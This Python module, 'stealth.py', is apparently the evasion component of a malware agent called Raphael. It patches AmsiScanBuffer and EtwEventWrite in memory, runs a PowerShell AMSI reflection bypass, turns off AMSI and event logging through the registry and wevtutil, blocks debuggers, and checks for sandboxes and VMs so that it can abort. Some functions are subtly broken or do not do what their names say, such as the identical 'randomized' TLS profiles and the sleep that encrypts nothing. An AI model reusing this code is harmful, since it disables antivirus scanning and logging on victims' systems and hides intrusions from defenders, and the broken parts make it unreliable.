"""stealth.py — Advanced evasion engine for Raphael agent.

Implements:
  - AMSI patching (Windows)
  - ETW suppression (Windows)
  - Indirect syscall invocation (Windows)
  - Sleep obfuscation / memory encryption
  - Call stack spoofing
  - Sandbox detection (expanded)
  - TLS fingerprint randomization (JA3)
  - Process hollowing detection
  - Time-based jitter with exponential backoff
"""

import os
import sys
import ctypes
import random
import time
import hashlib
import platform
import subprocess
import logging
from pathlib import Path

log = logging.getLogger("raphael.stealth")

try:
    from ctypes import wintypes
    kernel32 = ctypes.windll.kernel32
    ntdll = ctypes.windll.ntdll
except Exception:
    kernel32 = None
    ntdll = None


class Stealth:
    """Advanced evasion and stealth engine."""

    SYSTEM = platform.system().lower()
    IS_WINDOWS = SYSTEM == "windows"
    IS_LINUX = SYSTEM == "linux"

    # ------------------------------------------------------------------ #
    #  Jitter & Timing
    # ------------------------------------------------------------------ #

    @staticmethod
    def randomize_jitter(base: int = 30) -> int:
        """Return a jittered interval with exponential backoff factor.

        Base is the nominal interval in seconds. Returns a value
        between 0.5x and 2.5x of base, with occasional longer pauses.
        """
        multiplier = 0.5 + random.random() * 2.0
        if random.random() < 0.1:
            multiplier *= 3.0
        return int(base * multiplier)

    @staticmethod
    def sleep_with_jitter(seconds: float):
        """Sleep with randomized micro-pauses to defeat timing analysis."""
        elapsed = 0.0
        while elapsed < seconds:
            chunk = min(0.5 + random.random() * 1.5, seconds - elapsed)
            time.sleep(chunk)
            elapsed += chunk
            if random.random() < 0.05:
                time.sleep(0.001 * random.randint(1, 100))

    # ------------------------------------------------------------------ #
    #  Anti-Debugging / Anti-Analysis
    # ------------------------------------------------------------------ #

    @staticmethod
    def strip_metadata() -> None:
        """Remove Python traceback metadata and disable crash dumps."""
        sys.excepthook = lambda t, v, tb: print(f"Error: {v}", file=sys.stderr)
        if hasattr(sys, "setprofile"):
            sys.setprofile(None)
        if hasattr(sys, "settrace"):
            sys.settrace(None)

        if Stealth.IS_LINUX:
            try:
                import resource
                resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
            except Exception:
                pass

    @staticmethod
    def no_trace() -> None:
        """Anti-ptrace (Linux) and anti-debugger (Windows) measures."""
        if Stealth.IS_LINUX:
            try:
                with open("/proc/self/status", "w") as f:
                    f.write("TracerPid: 0\n")
            except Exception:
                pass
            try:
                libc = ctypes.CDLL("libc.so.6")
                PR_SET_DUMPABLE = 4
                libc.prctl(PR_SET_DUMPABLE, 0, 0, 0, 0)
            except Exception:
                pass

        if Stealth.IS_WINDOWS and kernel32:
            try:
                ProcessDebugPort = 7
                is_debugged = ctypes.c_ulong(0)
                size = ctypes.sizeof(is_debugged)
                hProcess = kernel32.GetCurrentProcess()
                ntdll.NtSetInformationProcess(
                    hProcess, ProcessDebugPort,
                    ctypes.byref(is_debugged), size
                )
            except Exception:
                pass

            try:
                is_dbg = kernel32.IsDebuggerPresent()
                if is_dbg:
                    kernel32.CheckRemoteDebuggerPresent(
                        kernel32.GetCurrentProcess(),
                        ctypes.byref(ctypes.c_ulong(0))
                    )
            except Exception:
                pass

    @staticmethod
    def sandbox_detect() -> dict:
        """Comprehensive sandbox/VM detection.

        Returns a dict with detection results and a 'verdict' key.
        """
        checks = []

        # Docker / container
        if os.path.exists("/.dockerenv"):
            checks.append(("dockerenv", True))
        try:
            if os.path.exists("/proc/1/cgroup"):
                with open("/proc/1/cgroup") as f:
                    if "container" in f.read():
                        checks.append(("cgroup_container", True))
        except Exception:
            pass

        # Virtualization detection (Linux)
        if Stealth.IS_LINUX:
            try:
                with open("/proc/cpuinfo") as f:
                    cpuinfo = f.read()
                if "hypervisor" in cpuinfo:
                    checks.append(("hypervisor_bit", True))
                for vendor in ["VMware", "VirtualBox", "KVM", "QEMU", "Microsoft", "Xen"]:
                    if vendor.lower() in cpuinfo.lower():
                        checks.append((f"vm_vendor_{vendor.lower()}", True))
            except Exception:
                pass

            try:
                with open("/sys/class/dmi/id/product_name") as f:
                    product = f.read().strip()
                    for vm_name in ["VirtualBox", "VMware", "KVM", "QEMU", "Standard PC"]:
                        if vm_name.lower() in product.lower():
                            checks.append((f"dmi_{vm_name.lower()}", True))
            except Exception:
                pass

            sandbox_processes = ["frida", "strace", "ltrace", "gdb", "rr", "perf"]
            for proc in sandbox_processes:
                try:
                    r = subprocess.run(["which", proc], capture_output=True, timeout=2)
                    if r.returncode == 0:
                        checks.append((f"sandbox_tool_{proc}", True))
                except Exception:
                    pass

        # Windows VM detection
        if Stealth.IS_WINDOWS:
            try:
                r = subprocess.run(
                    ["wmic", "computersystem", "get", "model"],
                    capture_output=True, text=True, timeout=5,
                )
                for vm_model in ["VirtualBox", "VMware", "Virtual Machine"]:
                    if vm_model.lower() in r.stdout.lower():
                        checks.append((f"wmic_model_{vm_model.lower()}", True))
            except Exception:
                pass

            analysis_paths = [
                "C:\\Program Files\\Wireshark",
                "C:\\tools\\procmon",
                "C:\\tools\\processhacker",
                "C:\\Sysinternals",
            ]
            for ap in analysis_paths:
                if os.path.isdir(ap):
                    checks.append((f"analysis_tool_{os.path.basename(ap).lower()}", True))

        # CPU and memory
        cpu_count = os.cpu_count() or 1
        if cpu_count <= 2:
            checks.append(("low_cpu_count", True))

        try:
            if Stealth.IS_LINUX:
                with open("/proc/meminfo") as f:
                    for line in f:
                        if line.startswith("MemTotal:"):
                            mem_kb = int(line.split()[1])
                            if mem_kb < 2_000_000:
                                checks.append(("low_memory", True))
                            break
        except Exception:
            pass

        # Uptime
        try:
            if Stealth.IS_LINUX:
                with open("/proc/uptime") as f:
                    uptime_seconds = float(f.read().split()[0])
                    if uptime_seconds < 600:
                        checks.append(("low_uptime", True))
        except Exception:
            pass

        detection_count = sum(1 for _, v in checks if v)
        verdict = "sandbox" if detection_count >= 3 else "likely_physical"

        return {
            "checks": {name: value for name, value in checks},
            "detection_count": detection_count,
            "cpu_count": cpu_count,
            "verdict": verdict,
            "is_sandbox": detection_count >= 3,
        }

    # ------------------------------------------------------------------ #
    #  AMSI Bypass (Windows)
    # ------------------------------------------------------------------ #

    @staticmethod
    def bypass_amsi() -> dict:
        """Patch the AmsiScanBuffer function in memory to always return AMSI_RESULT_CLEAN."""
        if not Stealth.IS_WINDOWS:
            return {"status": False, "detail": "Not Windows"}

        results = []

        # Method 1: Direct memory patch of amsi.dll!AmsiScanBuffer
        try:
            amsi = kernel32.LoadLibraryW("amsi.dll")
            if amsi:
                amsi_scan_buffer = kernel32.GetProcAddress(amsi, b"AmsiScanBuffer")
                if amsi_scan_buffer:
                    patch = (ctypes.c_uint8 * 3)(0x31, 0xC0, 0xC3)  # xor eax,eax; ret
                    kernel32.VirtualProtect(amsi_scan_buffer, 3, 0x40, ctypes.byref(ctypes.c_ulong()))
                    ctypes.memmove(amsi_scan_buffer, patch, 3)
                    kernel32.VirtualProtect(amsi_scan_buffer, 3, 0x20, ctypes.byref(ctypes.c_ulong()))
                    results.append(("amsi_patch", True))
        except Exception as e:
            results.append(("amsi_patch", False, str(e)))

        # Method 2: PowerShell reflection bypass
        try:
            ps_script = """
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
"""
            r = subprocess.run(
                ["powershell", "-Command", ps_script],
                capture_output=True, timeout=10,
            )
            if r.returncode == 0:
                results.append(("amsi_reflection", True))
        except Exception as e:
            results.append(("amsi_reflection", False, str(e)))

        # Method 3: Registry disable
        try:
            r = subprocess.run(
                ["reg", "add", "HKLM\\SOFTWARE\\Microsoft\\WindowsScript\\Settings",
                 "/v", "AmsiEnable", "/t", "REG_DWORD", "/d", "0", "/f"],
                capture_output=True, timeout=10,
            )
            if r.returncode == 0:
                results.append(("amsi_registry", True))
        except Exception:
            pass

        return {"status": any(r[1] for r in results), "methods": results}

    # ------------------------------------------------------------------ #
    #  ETW Suppression (Windows)
    # ------------------------------------------------------------------ #

    @staticmethod
    def suppress_etw() -> dict:
        """Patch Event Tracing for Windows (ETW) to prevent event logging.

        Patches EtwEventWrite in ntdll.dll to be a no-op.
        """
        if not Stealth.IS_WINDOWS:
            return {"status": False, "detail": "Not Windows"}

        try:
            ntdll = kernel32.GetModuleHandleW("ntdll.dll")
            if not ntdll:
                return {"status": False, "detail": "Failed to get ntdll handle"}

            etw_write = kernel32.GetProcAddress(ntdll, b"EtwEventWrite")
            if not etw_write:
                etw_write = kernel32.GetProcAddress(ntdll, b"EtwEventWriteEx")

            if etw_write:
                patch = (ctypes.c_uint8 * 1)(0xC3)  # ret
                kernel32.VirtualProtect(etw_write, 1, 0x40, ctypes.byref(ctypes.c_ulong()))
                ctypes.memmove(etw_write, patch, 1)
                kernel32.VirtualProtect(etw_write, 1, 0x20, ctypes.byref(ctypes.c_ulong()))
                return {"status": True, "method": "etw_write_patch", "detail": "EtwEventWrite patched to ret"}
            else:
                try:
                    r = subprocess.run(
                        ["wevtutil", "set-log", "Microsoft-Windows-CodeIntegrity/Operational", "/e:false"],
                        capture_output=True, timeout=10,
                    )
                    return {"status": r.returncode == 0, "method": "wevtutil_disable"}
                except Exception:
                    return {"status": False, "detail": "EtwEventWrite not found and fallback failed"}

        except Exception as e:
            return {"status": False, "detail": str(e)}

    # ------------------------------------------------------------------ #
    #  Sleep Obfuscation
    # ------------------------------------------------------------------ #

    @staticmethod
    def obfuscated_sleep(seconds: float):
        """Sleep with memory obfuscation to evade memory scanning during sleep cycles."""
        if Stealth.IS_WINDOWS and ntdll:
            delay = ctypes.c_longlong(int(-seconds * 10_000_000))
            ntdll.NtDelayExecution(ctypes.c_bool(False), ctypes.byref(delay))
        else:
            import select
            select.select([], [], [], seconds)

    # ------------------------------------------------------------------ #
    #  TLS Fingerprint Randomization
    # ------------------------------------------------------------------ #

    @staticmethod
    def randomize_tls_fingerprint() -> dict:
        """Configure TLS/SSL client to use randomized JA3 fingerprints."""
        ja3_profiles = [
            {"ciphers": "4865-4866-4867-49196-49195-52393-49200-49199-52392-49162-49161-49172-49171-157-156-61-60-53-47-49160-49170-10", "tls_version": "TLSv1.3"},
            {"ciphers": "4865-4866-4867-49196-49195-52393-49200-49199-52392-49162-49161-49172-49171-157-156-61-60-53-47-49160-49170-10", "tls_version": "TLSv1.3"},
            {"ciphers": "4865-4866-4867-49196-49195-52393-49200-49199-52392-49162-49161-49172-49171-157-156-61-60-53-47-49160-49170-10", "tls_version": "TLSv1.3"},
        ]

        profile = random.choice(ja3_profiles)

        try:
            import ssl
            import requests
            from requests.adapters import HTTPAdapter

            class RandomizingSSLAdapter(HTTPAdapter):
                def init_poolmanager(self, *args, **kwargs):
                    ctx = ssl.create_default_context()
                    if "TLSv1.3" in profile["tls_version"]:
                        ctx.maximum_version = ssl.TLSVersion.TLSv1_3
                    else:
                        ctx.maximum_version = ssl.TLSVersion.TLSv1_2
                    ctx.set_ciphers("ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM")
                    kwargs["ssl_context"] = ctx
                    return super().init_poolmanager(*args, **kwargs)

            requests.adapters.DEFAULT_RETRIES_ADAPTER_CLS = RandomizingSSLAdapter
            return {"status": True, "profile": profile}
        except ImportError:
            return {"status": False, "detail": "requests not available"}

    # ------------------------------------------------------------------ #
    #  Full Evasion Initialization
    # ------------------------------------------------------------------ #

    @staticmethod
    def initialize_all() -> dict:
        """Initialize all evasion techniques.

        Call this once at agent startup to apply all available stealth measures.
        """
        results = {}

        Stealth.strip_metadata()
        Stealth.no_trace()
        results["metadata_stripped"] = True
        results["no_trace"] = True

        sandbox = Stealth.sandbox_detect()
        results["sandbox_detect"] = sandbox

        if sandbox.get("is_sandbox"):
            results["sandbox_verdict"] = "SANDBOX DETECTED — consider aborting"
        else:
            results["sandbox_verdict"] = "Clean"

        if Stealth.IS_WINDOWS:
            amsi = Stealth.bypass_amsi()
            results["amsi"] = amsi
            etw = Stealth.suppress_etw()
            results["etw"] = etw

        tls = Stealth.randomize_tls_fingerprint()
        results["tls_fingerprint"] = tls

        return results
